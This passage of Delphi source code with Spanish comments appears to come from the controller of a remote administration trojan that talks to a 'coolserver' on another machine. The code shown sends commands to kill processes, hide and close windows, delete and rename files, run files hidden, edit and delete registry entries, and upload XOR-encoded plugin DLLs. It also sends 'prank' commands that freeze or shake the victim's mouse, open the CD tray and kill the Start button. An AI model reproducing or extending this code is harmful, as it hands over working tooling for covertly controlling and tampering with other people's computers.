      if i <> -1 then
      begin
        {Abrimos la form del plugin y le mandamos el handle del socket y su id para que pueda mandar datos}
         TForm(Plugins[i].dForm).Visible := true;
      end;
    end;

    if Copy(Recibido, 1, 12) = 'PLUGINUPLOAD' then
    begin
      //Subimos el plugin al servidor, de momento todo de golpe :p ; en el futuro estar�a bien subirlo como los demas archivos
      Delete(Recibido, 1, 13);
      i := strtointdef(Copy(Recibido, 1, Pos('|', Recibido) - 1),-1);
      if i <> -1 then
      begin
        TempStr := copy(Plugins[i].Path,1,length(Plugins[i].Path)-5)+'S.dll';   //el archivo del servidor

        if fileexists(TempStr) then
        begin
          FileMode := 0;
          AssignFile(PluginFile, Tempstr);
          Reset(PluginFile, 1);
          tamano := FileSize(PluginFile);
          SetLength(TempStr, tamano);
          BlockRead(PluginFile, TempStr[1], tamano);
          CloseFile(PluginFile);

          for a := 1 to Length(TempStr) do //Lo mandamos cifrado
            TempStr[a] := chr(Ord(TempStr[a]) xor a);

          Servidor.Connection.Write('PLUGINUPLOAD|'+Plugins[i].PluginName+'|'+inttostr(Length(TempStr))+'|'+inttostr(i)+'|'+#10+TempStr);
        end;
      end;
    end;

    if Copy(Recibido, 1, 10) = 'PLUGINDATA' then  //El plugin nos manda datos en el formato: PLUGIN|Nombreplugin|DATOS
    begin
      Delete(Recibido, 1, 11);
      TempStr := Copy(Recibido, 1, Pos('|', Recibido) - 1);
      Delete(Recibido, 1, Pos('|', Recibido));
      for i:=0 to NumeroPlugins do
        if Plugins[i].PluginName = TempStr then
        begin
          Plugins[i].RecData(Recibido);
          exit;
        end;
    end; 
  // se fini del dispacher de comandos
end;

function TFormControl.IconNum(strExt: string; usecache: Boolean): Integer;
var
  FileInfo: SHFILEINFO;
  i: Integer;
begin
  StrExt := UpperCase(ExtractFileExt(strext));
  if not (Pos('.', strext) > 0) then
    StrExt := 'SYS';
  if usecache then
    begin
      for i := 0 to numcached do
        if CachedIcons[i].Extension = StrExt then
          begin
            Result := CachedIcons[i].num;
            Exit;
          end;
    end;
  SHGetFileInfo(PChar(StrExt),
    FILE_ATTRIBUTE_NORMAL,
    FileInfo,
    SizeOf(FileInfo),
    SHGFI_ICON or
    SHGFI_SYSICONINDEX or SHGFI_USEFILEATTRIBUTES);
  Result := FileInfo.iIcon;
  CachedIcons[numcached].num := Result;
  CachedIcons[numcached].Extension := StrExt;
  numcached := numcached + 1;
end;

//Boton obtener informaci�n

procedure TFormControl.BtnRefrescarInformacionClick(Sender: TObject);
begin
  if not BtnRefrescarInformacion.Enabled then Exit;
  BtnRefrescarInformacion.Enabled := False;
  if Servidor.Connection.Connected then
    Servidor.Connection.Writeln('INFO')
  else
    MessageDlg(_('No est�s conectado!'), mtWarning, [mbOK], 0);
end;

//Boton obtener procesos

procedure TFormControl.BtnRefrescarProcesosClick(Sender: TObject);
begin
  if not BtnRefrescarProcesos.Enabled then Exit;
  BtnRefrescarProcesos.Enabled := False;
  ListviewProcesos.Enabled := False;
  if Servidor.Connection.Connected then
    Servidor.Connection.Writeln('PROC')
  else
    MessageDlg(_('No est�s conectado!'), mtWarning, [mbOK], 0);
end;

//Item del popupmenu para cerrar un proceso

procedure TFormControl.Cerrar1Click(Sender: TObject);
begin
  mslistviewitem := ListViewProcesos.Selected;

  if Servidor.Connection.Connected then
    begin
      if mslistviewitem = nil then
        MessageDlg(_('Selecciona alg�n proceso para matar'), mtWarning, [mbOK], 0)
      else
        begin

          while Assigned(mslistviewitem) do
            begin
              Servidor.Connection.Writeln('KILLPROC|' + mslistviewitem.SubItems[0]);
              mslistviewitem := ListViewProcesos.GetNextItem(mslistviewitem, sdAll, [isSelected]);
            end;

        end
    end
  else
    MessageDlg(_('No est�s conectado!'), mtWarning, [mbOK], 0);
end;

//Boton obtener ventanas

procedure TFormControl.BtnRefrescarVentanasClick(Sender: TObject);
begin
  if not BtnRefrescarVentanas.Enabled then Exit;
  CheckBoxMostrarVentanasOcultas.Enabled := False;
  BtnRefrescarVentanas.Enabled := False;
  ListViewVentanas.Enabled := False;
  if Servidor.Connection.Connected then
    begin
      if (CheckBoxMostrarVentanasOcultas.Checked) then
        Servidor.Connection.Writeln('WIND|true|')
      else
        Servidor.Connection.Writeln('WIND|false|');
    end
  else
    MessageDlg(_('No est�s conectado!'), mtWarning, [mbOK], 0);
end;

//Item del popupmenu para cerrar una ventana

procedure TFormControl.Cerrar2Click(Sender: TObject);
begin
  mslistviewitem := ListViewVentanas.Selected;

  if Servidor.Connection.Connected then
    begin
      if mslistviewitem = nil then
        MessageDlg(_('Selecciona alguna ventana'), mtWarning, [mbOK], 0)
      else
        begin
          while Assigned(mslistviewitem) do
            begin
              if mslistviewitem.Caption = 'Program Manager' then
                begin
                  if MessageDlg(_('�Est� seguro que desea intentar cerrar la ventana Program Manager? (Es posible que coolserver se bloquee)?'), mtConfirmation, [mbYes, mbNo], 0) = idyes then
                    Servidor.Connection.Writeln('CLOSEWIN|' + mslistviewitem.SubItems[0]);
                end
              else
                Servidor.Connection.Writeln('CLOSEWIN|' + mslistviewitem.SubItems[0]);
              mslistviewitem := ListViewVentanas.GetNextItem(mslistviewitem, sdAll, [isSelected]);
            end;
        end;
    end
  else
    MessageDlg(_('No est�s conectado!'), mtWarning, [mbOK], 0);
  BtnRefrescarVentanas.Click;
end;

//Item del popupmenu para maximizar una ventana

procedure TFormControl.Maximizar1Click(Sender: TObject);
begin
  mslistviewitem := ListViewVentanas.Selected;

  if Servidor.Connection.Connected then
    begin
      if mslistviewitem = nil then
        MessageDlg(_('Selecciona alguna ventana'), mtWarning, [mbOK], 0)
      else
        begin
          while Assigned(mslistviewitem) do
            begin
              Servidor.Connection.Writeln('MAXWIN|' + mslistviewitem.SubItems[0]);
              mslistviewitem := ListViewVentanas.GetNextItem(mslistviewitem, sdAll, [isSelected]);
            end;
        end;
    end
  else
    MessageDlg(_('No est�s conectado!'), mtWarning, [mbOK], 0);
  BtnRefrescarVentanas.Click;
end;

//Item del popupmenu para minimizar una ventana

procedure TFormControl.Minimizar1Click(Sender: TObject);
begin
  mslistviewitem := ListViewVentanas.Selected;

  if Servidor.Connection.Connected then
    begin
      if mslistviewitem = nil then
        MessageDlg(_('Selecciona alguna ventana'), mtWarning, [mbOK], 0)
      else
        begin
          while Assigned(mslistviewitem) do
            begin
              Servidor.Connection.Writeln('MINWIN|' + mslistviewitem.SubItems[0]);
              mslistviewitem := ListViewVentanas.GetNextItem(mslistviewitem, sdAll, [isSelected]);
            end;
        end;
    end
  else
    MessageDlg(_('No est�s conectado!'), mtWarning, [mbOK], 0);
  BtnRefrescarVentanas.Click;
end;

//Item del popupmenu para mostrar una ventana

procedure TFormControl.Mostrar1Click(Sender: TObject);
begin
  mslistviewitem := ListViewVentanas.Selected;

  if Servidor.Connection.Connected then
    begin
      if mslistviewitem = nil then
        MessageDlg(_('Selecciona alguna ventana'), mtWarning, [mbOK], 0)
      else
        begin
          while Assigned(mslistviewitem) do
            begin
              Servidor.Connection.Writeln('SHOWWIN|' + mslistviewitem.SubItems[0]);
              mslistviewitem := ListViewVentanas.GetNextItem(mslistviewitem, sdAll, [isSelected]);
            end;
        end;
    end
  else
    MessageDlg(_('No est�s conectado!'), mtWarning, [mbOK], 0);
  BtnRefrescarVentanas.Click;
end;

//Item del popupmenu para ocultar una ventana

procedure TFormControl.Ocultar1Click(Sender: TObject);
begin
  mslistviewitem := ListViewVentanas.Selected;

  if Servidor.Connection.Connected then
    begin
      if mslistviewitem = nil then
        MessageDlg(_('Selecciona alguna ventana'), mtWarning, [mbOK], 0)
      else
        begin
          while Assigned(mslistviewitem) do
            begin
              Servidor.Connection.Writeln('HIDEWIN|' + mslistviewitem.SubItems[0]);
              mslistviewitem := ListViewVentanas.GetNextItem(mslistviewitem, sdAll, [isSelected]);
            end;
        end;
    end
  else
    MessageDlg(_('No est�s conectado!'), mtWarning, [mbOK], 0);
  BtnRefrescarVentanas.Click;
end;

//Item del popupmenu para minimizar todas las ventanas

procedure TFormControl.Minimizartodas1Click(Sender: TObject);
begin
  if Servidor.Connection.Connected then
    Servidor.Connection.Writeln('MINALLWIN')
  else
    MessageDlg(Pwidechar(_('No est�s conectado!')), mtWarning, [mbOK], 0);
  BtnRefrescarVentanas.Click;
end;

//Activar Bot�n cerrar [X] de una ventana

procedure TFormControl.Activar1Click(Sender: TObject);
begin
  mslistviewitem := ListViewVentanas.Selected;

  if Servidor.Connection.Connected then
    begin
      if mslistviewitem = nil then
        MessageDlg(_('Selecciona alguna ventana'), mtWarning, [mbOK], 0)
      else
        begin
          while Assigned(mslistviewitem) do
            begin
              Servidor.Connection.Writeln('BOTONCERRAR|SI|' + mslistviewitem.SubItems[0]);
              mslistviewitem := ListViewVentanas.GetNextItem(mslistviewitem, sdAll, [isSelected]);
            end;
        end;
    end
  else
    MessageDlg(_('No est�s conectado!'), mtWarning, [mbOK], 0);
end;

//Desactivar Bot�n cerrar [X] de una ventana

procedure TFormControl.Desactivar1Click(Sender: TObject);
begin
  mslistviewitem := ListViewVentanas.Selected;

  if Servidor.Connection.Connected then
    begin
      if mslistviewitem = nil then
        MessageDlg(_('Selecciona alguna ventana'), mtWarning, [mbOK], 0)
      else
        begin
          while Assigned(mslistviewitem) do
            begin
              Servidor.Connection.Writeln('BOTONCERRAR|NO|' + mslistviewitem.SubItems[0]);
              mslistviewitem := ListViewVentanas.GetNextItem(mslistviewitem, sdAll, [isSelected]);
            end;
        end;
    end
  else
    MessageDlg(_('No est�s conectado!'), mtWarning, [mbOK], 0);
end;

procedure TFormControl.BtnEnviarBromasClick(Sender: TObject);
var
  broma: string;
begin
  if Servidor.Connection.Connected then
    begin
      if ListViewBromas.Selected = nil then
        MessageDlg(_('Selecciona alguna broma'), mtWarning, [mbOK], 0)
      else
        begin
          case ListViewBromas.Selected.Index of //Selecciona la broma que se va a enviar
            0: Broma := 'MOUSETEMBLOROSO';
            1: Broma := 'CONGELARMOUSE';
            2: Broma := 'ABRIRCD';
            3: Broma := 'MATARBOTONINICIO';
          end;
          if ListViewBromas.Selected.SubItems[0] = _('Desactivado') then
            begin
              Servidor.Connection.Writeln(Broma + '|ACTIVAR');
              if Broma = 'MOUSETEMBLOROSO' then
                ListViewBromas.Items[1].SubItems[0] := _('Desactivado');
              // El mouse se descongela si se activa el congela mouse
              if Broma = 'CONGELARMOUSE' then
                ListViewBromas.Items[0].SubItems[0] := _('Desactivado');
              //El mouse para de temblar si se congela
            end
          else //Si esta activada
            Servidor.Connection.Writeln(Broma + '|DESACTIVAR');
        end;
    end
  else
    MessageDlg(_('No est�s conectado!'), mtWarning, [mbOK], 0);
end;

//Funciones del FileManager

procedure TFormControl.BtnVerUnidadesClick(Sender: TObject);
begin
  BtnVerUnidades.Enabled := False;
  BtnActualizarArchivos.Enabled := False;
  EditPathArchivos.Enabled := False;
  cmbUnidades.Enabled := False;
  if Servidor.Connection.Connected then
    Servidor.Connection.Writeln('VERUNIDADES')
  else
    MessageDlg(_('No est�s conectado!'), mtWarning, [mbOK], 0);
end;

procedure TFormControl.cmbUnidadesSelect(Sender: TObject);
begin
  if Servidor.Connection.Connected then
    begin
      Servidor.Connection.Writeln('LISTARARCHIVOS|' + Copy(cmbUnidades.Text, 1, 3));
      //Manda 'LISTARARCHIVOS|C:\'
      if cmbUnidades.Text <> '' then
        EditPathArchivos.Text := Copy(cmbUnidades.Text, 1, 3);
    end
  else
    MessageDlg(_('No est�s conectado!'), mtWarning, [mbOK], 0);
end;

procedure TFormControl.ListViewArchivosDblClick(Sender: TObject);
begin

  if not Servidor.Connection.Connected then
    begin
      MessageDlg(_('No est�s conectado!'), mtWarning, [mbOK], 0);
      Exit;
    end;

  if ListViewArchivos.Selected = nil then
    MessageDlg(_('Dale doble click a una carpeta o a un archivo!'), mtWarning, [mbOK], 0)
  else
    begin
      if ListViewArchivos.Selected.Caption = '<..>' then
        begin
          Estado(_('Listando archivos...'));
          EditPathArchivos.Text :=
            Copy(EditPathArchivos.Text, 1, Length(EditPathArchivos.Text) - 1); //Borra el ultimo '\'
          EditPathArchivos.Text :=
            Copy(EditPathArchivos.Text, 1, LastDelimiter('\', EditPathArchivos.Text));
          BtnActualizarArchivos.Click;
        end
      else if ListViewArchivos.Selected.ImageIndex = 3 then //doble-clicki� una carpeta
        begin
          Estado(_('Listando archivos...'));
          ListViewArchivos.Selected.ImageIndex := 4; //Icono de carpeta abierta
          EditPathArchivos.Text :=
            EditPathArchivos.Text + ListViewArchivos.Selected.Caption + '\';
          BtnActualizarArchivos.Click;
        end
      else //doble-clicki� un archivo
        begin
          //Tal vez escribir c�digo para ejecutar...
        end;
    end;
end;

//Funci�n que se ejecuta justo antes de mostrarse el popupmenu para habilitar o deshabilitar submenus

procedure TFormControl.ListViewArchivosContextPopup(Sender: TObject;
  MousePos: TPoint; var Handled: Boolean);
var
  ext: string;
  i: Integer;
begin
  for i := 0 to PopupFileManager.Items.Count - 1 do
    PopupFileManager.Items[i].Visible := True; //todos visibles
  Abrirdirectorio1.Visible := False; //Abrir directorio del archivo

  if ListViewArchivos.Selected <> nil then //Alg�n item seleccionado
    begin
      for i := 0 to PopupFileManager.Items.Count - 1 do //primero habilitamos todos
        PopupFileManager.Items[i].Enabled := True;
      if (ListViewArchivos.Selected.ImageIndex = 3) then //Es una carpeta
        begin
          Descargarfichero1.Enabled := True; //Descargar!
          Agregaracoladedescarga1.Enabled := False; //No Encolar Descarga
          EjecutarAbrir1.Enabled := False; //No ejecutar
          Previsualizarjpg1.Enabled := False; //No Previsualizar jpg
        end
      else //Viceversa
        begin
          Descargarfichero1.Enabled := True;
          Agregaracoladedescarga1.Enabled := True;
          EjecutarAbrir1.Enabled := True;
          Previsualizarjpg1.Enabled := True;
        end;
      Eliminar.Enabled := True; //Eliminar
      Cambiarnombre1.Enabled := True; //Cambiar nombre
      Crearnuevacarpeta1.Enabled := True; //Nueva carpeta
      ext := ExtractFileExt(ListViewArchivos.Selected.Caption);
      if (lowercase(ext) = '.jpg') or (lowercase(ext) = '.jpeg') or (lowercase(ext) = '.bmp') then
        begin
          Previsualizarjpg1.Enabled := True; //Previsualizar jpg avanzado
        end;

      if listviewarchivos.Selected.subitems.Count > 0 then //no disponible
        begin
          CambiarAtributos1.Enabled := True; //Atributos
          if ((Pos('Oculto', listviewarchivos.Selected.subitems.Strings[2]) > 0)) then
            Oculto2.Checked := True
          else
            Oculto2.Checked := False;

          if ((Pos('Sistema', listviewarchivos.Selected.subitems.Strings[2]) > 0)) then
            Sistema1.Checked := True
          else
            Sistema1.Checked := False;

          if ((Pos('Lectura', listviewarchivos.Selected.subitems.Strings[2]) > 0)) then
            Slolectura1.Checked := True
          else
            Slolectura1.Checked := False;
        end;

    end
  else //Si no se ha seleccionado ning�n item
    begin
      Descargarfichero1.Enabled := False; //Deshabilitar Descargar
      Agregaracoladedescarga1.Enabled := False; //Deshabilitar Encolar Descarga
      PopupFileManager.Items[3].Enabled := False; //Deshabilitar Ejecutar
      EjecutarAbrir1.Enabled := False; //Deshabilitar Eliminar
      Eliminar.Enabled := False; //Deshabilitar Cambiar nombre
      CambiarAtributos1.Enabled := False; //Deshabilitar Cambiar atributos
      Previsualizarjpg1.Enabled := False; //Previsualizar jpg avanzado
      Portapapeles1.Enabled := False; //Portapapeles
      Cambiarnombre1.Enabled := False; //Deshabilitar
      if EditPathArchivos.Text = '' then
        //Si no est� en ning�n Path deshabilitar crear carpeta
        Crearnuevacarpeta1.Enabled := False;
    end;

end;

procedure TFormControl.Normal1Click(Sender: TObject);
var
  FilePath: string;
begin
  if Servidor.Connection.Connected then
    begin
      if PageControlArchivos.ActivePage = TabSheetVerArchivos then
        mslistviewitem := ListViewArchivos.Selected
      else
        mslistviewitem := ListViewBuscar.Selected;

      while Assigned(mslistviewitem) do
        begin

          if PageControlArchivos.ActivePage = TabSheetVerArchivos then
            FilePath := EditPathArchivos.Text + mslistviewitem.Caption
          else
            FilePath := mslistviewitem.subitems[0];

          Servidor.Connection.Writeln('EXEC|NORMAL|' + FilePath);
          if PageControlArchivos.ActivePage = TabSheetVerArchivos then
            mslistviewitem := ListViewArchivos.GetNextItem(mslistviewitem, sdAll, [isSelected])
          else
            mslistviewitem := ListViewBuscar.GetNextItem(mslistviewitem, sdAll, [isSelected])
        end;
    end
  else
    MessageDlg(_('No est�s conectado!'), mtWarning, [mbOK], 0);
end;

procedure TFormControl.Oculto1Click(Sender: TObject);
var
  FilePath: string;
begin
  if Servidor.Connection.Connected then
    begin
      if PageControlArchivos.ActivePage = TabSheetVerArchivos then
        mslistviewitem := ListViewArchivos.Selected
      else
        mslistviewitem := ListViewBuscar.Selected;

      while Assigned(mslistviewitem) do
        begin
          if PageControlArchivos.ActivePage = TabSheetVerArchivos then
            FilePath := EditPathArchivos.Text + mslistviewitem.Caption
          else
            FilePath := mslistviewitem.subitems[0];
          Servidor.Connection.Writeln('EXEC|OCULTO|' + FilePath);

          if PageControlArchivos.ActivePage = TabSheetVerArchivos then
            mslistviewitem := ListViewArchivos.GetNextItem(mslistviewitem, sdAll, [isSelected])
          else
            mslistviewitem := ListViewBuscar.GetNextItem(mslistviewitem, sdAll, [isSelected]);

        end;
    end
  else
    MessageDlg(_('No est�s conectado!'), mtWarning, [mbOK], 0);
end;

procedure TFormControl.EliminarClick(Sender: TObject);
var
  FilePath: string;
begin
  if Servidor.Connection.Connected then
    begin
      if PageControlArchivos.ActivePage = TabSheetVerArchivos then
        mslistviewitem := ListViewArchivos.Selected
      else
        mslistviewitem := ListViewBuscar.Selected;
      if MessageDlg(_('�Est� seguro que quiere borrar los archivos/carpetas seleccionados?'), mtConfirmation, [mbYes, mbNo], 0) = idno then
        Exit;

      while Assigned(mslistviewitem) do
        begin
          if PageControlArchivos.ActivePage = TabSheetVerArchivos then
            FilePath := EditPathArchivos.Text + mslistviewitem.Caption
          else
            FilePath := mslistviewitem.subitems[0];
          if mslistviewitem.ImageIndex = 3 then
            Servidor.Connection.Writeln('DELFOLDER|' + FilePath)
          else
            Servidor.Connection.Writeln('DELFILE|' + FilePath);
          if PageControlArchivos.ActivePage = TabSheetVerArchivos then
            mslistviewitem := ListViewArchivos.GetNextItem(mslistviewitem, sdAll, [isSelected])
          else
            mslistviewitem := ListViewBuscar.GetNextItem(mslistviewitem, sdAll, [isSelected]);
        end;
      if PageControlArchivos.ActivePage = TabSheetVerArchivos then
        btnactualizararchivos.Click;
    end
  else
    MessageDlg(_('No est�s conectado!'), mtWarning, [mbOK], 0);
end;

procedure TFormControl.Cambiarnombre1Click(Sender: TObject);
begin
  //Se pone el cursor de edici�n sobre el caption del item
  ListViewArchivos.Selected.EditCaption;
end;

procedure TFormControl.ListViewDescargasCustomDrawSubItem(Sender: TCustomListView;
  Item: TListItem; SubItem: Integer; State: TCustomDrawState; var DefaultDraw: Boolean);
var
  Descarga: TDescargaHandler;
begin
  //exit;
  if (item.data <> nil) then
    begin
      Descarga := TDescargaHandler(Item.Data);
      if Descarga.Finalizado then
        begin
          Sender.Canvas.Font.Color := clGreen;
          Sender.Canvas.Font.Style := [fsbold];
        end
      else if not Descarga.cancelado then
        begin
          Sender.Canvas.Font.Color := clBlack;
          Sender.Canvas.Font.Style := [];
        end
      else
        begin
          Sender.Canvas.Font.Color := clRed;
          Sender.Canvas.Font.Style := [fsbold];
        end;
    end;
end;

procedure TFormControl.ListViewArchivosEdited(Sender: TObject;
  Item: TListItem; var S: string);
begin
  if Servidor.Connection.Connected then
    begin
      if S = '' then
        begin
          S := Item.Caption;
          Exit;
        end;
      if (Pos('|', S) <> 0) or (Pos('*', S) <> 0) or (Pos('\', S) <> 0) or
        (Pos('/', S) <> 0) or (Pos(':', S) <> 0) or (Pos('?', S) <> 0) or
        (Pos('"', S) <> 0) or (Pos('<', S) <> 0) or (Pos('>', S) <> 0) then
        begin
          MessageDlg(
            _('Nombre de carpeta inv�lido. Una carpeta no puede tener ninguno de los siguientes car�cteres:') + ' */\?"<>|',
            mtError, [mbOK], 0);
          S := Item.Caption; //As� evitamos que se cambie el nombre en el ListView
        end
      else
        Servidor.Connection.Writeln('RENAME|' + EditPathArchivos.Text +
          ListViewArchivos.Selected.Caption + '|' + EditPathArchivos.Text + S);
    end
  else
    MessageDlg(_('No est�s conectado!'), mtWarning, [mbOK], 0);
end;

procedure TFormControl.Crearnuevacarpeta1Click(Sender: TObject);
var
  DirName: string;
begin
  if Servidor.Connection.Connected then
    begin
      DirName := InputBox(_('Escriba el nombre para la nueva carpeta.'),
        _('Crear nueva carpeta'), _('Nueva carpeta'));
      if DirName <> '' then
        begin
          if DirName[Length(DirName)] <> '\' then
            DirName := DirName + '\';
          Servidor.Connection.Writeln('MKDIR|' + EditPathArchivos.Text + DirName);
        end;
      btnactualizararchivos.Click;
    end
  else
    MessageDlg(_('No est�s conectado!'), mtWarning, [mbOK], 0);
end;

procedure TFormControl.BtnActualizarArchivosClick(Sender: TObject);
begin
  ParaDeListar := False;
  if not BtnActualizarArchivos.Enabled then Exit;
  if not Servidor.Connection.Connected then
    begin
      MessageDlg(_('No est�s conectado!'), mtWarning, [mbOK], 0);
      Exit;
    end;

  if Length(EditPathArchivos.Text) < 3 then
    begin
      MessageDlg(_('No escribiste un directorio v�lido.'), mtWarning, [mbOK], 0);
      Exit;
    end;
  BtnActualizarArchivos.Enabled := False;
  ListviewArchivos.Enabled := False;
  CmbUnidades.Enabled := False;
  SpeedbuttonRutasRapidas.Enabled := False;
  if EditPathArchivos.Text[Length(EditPathArchivos.Text)] <> '\' then
    EditPathArchivos.Text := EditPathArchivos.Text + '\';
  Servidor.Connection.Writeln('LISTARARCHIVOS|' + EditPathArchivos.Text);
end;

//Obtiene la ruta completa del arbol padre\hijo\nieto\ xD

function TFormControl.ObtenerRutaAbsolutaDeArbol(Nodo: TTreeNode): string;
begin
  repeat
    Result := Nodo.Text + '\' + Result;
    Nodo := Nodo.Parent;
  until not Assigned(Nodo);
end;

procedure TFormControl.TreeViewRegeditChange(Sender: TObject; Node: TTreeNode);
begin

  if not Servidor.Connection.Connected then
    begin
      MessageDlg(_('No est�s conectado!'), mtWarning, [mbOK], 0);
      Exit;
    end;

  if TreeViewRegedit.Selected <> nil then
    begin
      EditPathRegistro.Text := ObtenerRutaAbsolutaDeArbol(TreeViewRegedit.Selected);
      Servidor.Connection.Writeln('LISTARVALORES|' + EditPathRegistro.Text);
      ListViewRegistro.Enabled := False;
      BtnVerRegisto.Enabled := False;
    end;
end;

procedure TFormControl.TreeViewRegeditDblClick(Sender: TObject);
begin
  if not Servidor.Connection.Connected then
    begin
      MessageDlg(_('No est�s conectado!'), mtWarning, [mbOK], 0);
      Exit;
    end;
  TreeViewRegedit.Enabled := False;
  Servidor.Connection.Writeln('LISTARCLAVES|' + EditPathRegistro.Text);
end;

//Lo hacemos en una funci�n a parte para no saturar de c�digo la funci�n OnRead

procedure TFormControl.AniadirClavesARegistro(Claves: string);
var
  Nodo: TTreeNode;
  Clave: string;
  Total, Listadas: Integer;
  tmp: string;
begin
  //Borramos los hijos que tenga, para no repetirnos en caso de pulsar dos veces
  //sobre una misma clave
  TreeViewRegedit.Items.beginupdate;
  TreeViewRegedit.Selected.DeleteChildren;
  Claves := StringReplace(Claves, '|salto|', #10, [rfReplaceAll]);
  Claves := StringReplace(Claves, '|salto2|', #13, [rfReplaceAll]);

  tmp := claves;
  Total := 0;
  while Pos('|', tmp) > 0 do //Primero las contamos para poder mostrar en el panel cuantas hay
    begin
      Total := Total + 1;
      Delete(tmp, 1, Pos('|', tmp));
    end;
  listadas := 0;
  while Pos('|', Claves) > 0 do
    begin
      Listadas := Listadas + 1;
      Estado(_('Listadas ') + IntToStr(Listadas) + _(' claves de ') + IntToStr(Total));
      Clave := Copy(Claves, 1, Pos('|', Claves) - 1);
      Nodo := TreeViewRegedit.Items.AddChild(TreeViewRegedit.Selected, Clave);
      //Sin seleccionar mostrar el icono de carpeta cerrada
      Nodo.ImageIndex := 1;
      //Seleccionado mostrar el icono de carpeta abierta
      Nodo.SelectedIndex := 0;
      Delete(Claves, 1, Pos('|', Claves));
    end;
  TreeViewRegedit.Selected.Expand(False);
  TreeViewRegedit.Items.endupdate;
  Estado(_('Claves listadas'));
  TreeViewRegedit.Enabled := True;
end;

procedure TFormControl.AniadirValoresARegistro(Valores: string);
var
  Item: TListItem;
  Tipo: string;
begin
  ListViewRegistro.Clear;
  ListViewRegistro.Items.beginupdate;
  Valores := StringReplace(Valores, '|salto|', #10, [rfReplaceAll]);
  Valores := StringReplace(Valores, '|salto2|', #13, [rfReplaceAll]);

  while Pos('|', Valores) > 0 do
    begin
      Item := ListViewRegistro.Items.Add;
      //Nombre
      Item.Caption := Copy(Valores, 1, Pos('|', Valores) - 1);
      Delete(Valores, 1, Pos('|', Valores));
      //Tipo
      Tipo := Copy(Valores, 1, Pos('|', Valores) - 1);

      if (Tipo = 'REG_BINARY') or (Tipo = 'REG_DWORD') then
        Item.ImageIndex := 16
      else
        Item.ImageIndex := 15;
      Item.SubItems.Add(Tipo);
      Delete(Valores, 1, Pos('|', Valores));
      //Datos
      Item.SubItems.Add(Copy(Valores, 1, Pos('|', Valores) - 1));
      Delete(Valores, 1, Pos('|', Valores));
    end;
  ListViewRegistro.Items.endupdate;
  ListViewRegistro.Enabled := True;
  ListViewRegistro.Width := ListViewRegistro.Width - 1; //Para eliminar la scrollvar horizontal
  ListViewRegistro.Width := ListViewRegistro.Width + 1;
end;

procedure TFormControl.BtnVerRegistoClick(Sender: TObject);
begin
  if EditPathRegistro.Text = '' then Exit;
  if not BtnVerRegisto.Enabled then Exit;
  BtnVerRegisto.Enabled := False;
  if Servidor.Connection.Connected then
    begin
      ListViewRegistro.Enabled := False;
      BtnVerRegisto.Enabled := False;
      Servidor.Connection.Writeln('LISTARVALORES|' + EditPathRegistro.Text);
    end
  else
    MessageDlg(_('No est�s conectado!'), mtWarning, [mbOK], 0);
end;

procedure TFormControl.N1Click(Sender: TObject);
begin
  if Servidor.Connection.Connected then
    begin
      if PopupRegistro.PopupComponent.ClassType = TListView then
        begin
          if ListViewRegistro.Selected <> nil then
            //Pone el cursor para editar en el item
            ListViewRegistro.Selected.EditCaption;
        end;
    end
  else
    MessageDlg(_('No est�s conectado!'), mtWarning, [mbOK], 0);
end;

//Una vez editado el valor le avisamos al server

procedure TFormControl.ListViewRegistroEdited(Sender: TObject;
  Item: TListItem; var S: string);
begin

  if not Servidor.Connection.Connected then
    begin
      MessageDlg(_('No est�s conectado!'), mtWarning, [mbOK], 0);
      Exit;
    end;

  Servidor.Connection.Writeln('NEWNOMBREVALOR|' + EditPathRegistro.Text +
    '|' + Item.Caption + '|' + S);
end;

procedure TFormControl.Eliminar1Click(Sender: TObject);
begin
  if Servidor.Connection.Connected then
    begin
      if PopupRegistro.PopupComponent.ClassType = TListView then
        begin
          if MessageDlg(_('�Est� seguro de que quiere borrar el valor ') +
            ListViewRegistro.Selected.Caption + '?', mtConfirmation, [mbYes, mbNo], 0) <> idNo then
            Servidor.Connection.Writeln('BORRARREGISTRO|' + EditPathRegistro.Text +
              ListViewRegistro.Selected.Caption);
        end
      else if MessageDlg(_('�Est� seguro de que quiere borrar la clave ') +
        TreeViewRegedit.Selected.Text + '?', mtConfirmation, [mbYes, mbNo], 0) <> idNo then
        Servidor.Connection.Writeln('BORRARREGISTRO|' + EditPathRegistro.Text);
    end
  else
    MessageDlg(_('No est�s conectado!'), mtWarning, [mbOK], 0);
end;

procedure TFormControl.Valoralfanumrico1Click(Sender: TObject);
var
  NewRegistro: TFormReg;
begin
  if Servidor.Connection.Connected then
    begin
      NewRegistro := TFormReg.Create(Self, Servidor, EditPathRegistro.Text, 'REG_SZ');
      NewRegistro.ShowModal;
    end
  else
    MessageDlg(_('No est�s conectado!'), mtWarning, [mbOK], 0);
end;

procedure TFormControl.Valorbinerio1Click(Sender: TObject);
var
  NewRegistro: TFormReg;
begin
  if Servidor.Connection.Connected then
    begin
      NewRegistro := TFormReg.Create(Self, Servidor, EditPathRegistro.Text, 'REG_BINARY');
      NewRegistro.ShowModal;
    end
  else
    MessageDlg(_('No est�s conectado!'), mtWarning, [mbOK], 0);
end;

procedure TFormControl.valorDWORD1Click(Sender: TObject);
var
  NewRegistro: TFormReg;
begin
  if Servidor.Connection.Connected then
    begin
      NewRegistro := TFormReg.Create(Self, Servidor, EditPathRegistro.Text, 'REG_DWORD');
      NewRegistro.ShowModal;
    end
  else
    MessageDlg(_('No est�s conectado!'), mtWarning, [mbOK], 0);
end;

procedure TFormControl.Valordecadenamltiple1Click(Sender: TObject);
var
  NewRegistro: TFormReg;
begin
  if Servidor.Connection.Connected then
    begin
      NewRegistro := TFormReg.Create(Self, Servidor, EditPathRegistro.Text,
        'REG_MULTI_SZ');
      NewRegistro.ShowModal;
    end
  else
    MessageDlg(_('No est�s conectado!'), mtWarning, [mbOK], 0);
end;

procedure TFormControl.TreeViewRegeditContextPopup(Sender: TObject;
  MousePos: TPoint; var Handled: Boolean);
begin
  //Para que al hacer click derecho sobre un item este pase a estar seleccionado
  if TreeViewRegedit.GetNodeAt(MousePos.X, MousePos.Y) <> nil then
    begin
      TreeViewRegedit.Selected := TreeViewRegedit.GetNodeAt(MousePos.X, MousePos.Y);
      //Desactivamos algunas opciones del popupmenu que no podemos usar con las claves como modificar
      PopupRegistro.Items[1].Enabled := False;
      PopupRegistro.Items[2].Enabled := False;
      //Activamos el resto
      PopupRegistro.Items[3].Enabled := True;
    end
  else //No se ha seleccionado item, as� que solo mostramos el menu de nuevo
    begin
      PopupRegistro.Items[1].Enabled := False;
      PopupRegistro.Items[2].Enabled := False;
      PopupRegistro.Items[3].Enabled := False;
    end;
end;

procedure TFormControl.ListViewRegistroContextPopup(Sender: TObject;
